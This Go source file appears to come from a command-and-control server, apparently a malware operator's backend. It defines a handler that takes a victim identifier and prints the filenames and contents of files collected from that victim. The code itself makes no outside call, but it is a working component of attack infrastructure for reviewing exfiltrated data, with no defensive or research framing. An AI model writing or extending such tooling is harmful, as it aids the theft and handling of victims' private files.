package handlers

import (
	"assimilate/c2c_server/v2/internal/model"
	"assimilate/c2c_server/v2/internal/types"
	"fmt"
)

func ShowSuperCat(state *model.ServerState) types.ShowSuperCatHandlerFunc {
	return func(victimHash string) {
		state.SuperCatTreeMutex.Lock()
		defer state.SuperCatTreeMutex.Unlock()

		if state.SuperCatTree == nil {
			fmt.Println("Supercat data tree not initialized.")
			return
		}

		val, found := state.SuperCatTree.Get(victimHash)
		if !found {
			fmt.Println("No supercat data found for:", victimHash)
			return
		}

		entries := val.([]types.IncomingSuperCatData)
		for _, entry := range entries {
			fmt.Printf("Filename: %s\nContent:\n%s\n\n", entry.Filename, entry.Content)
		}
	}
}
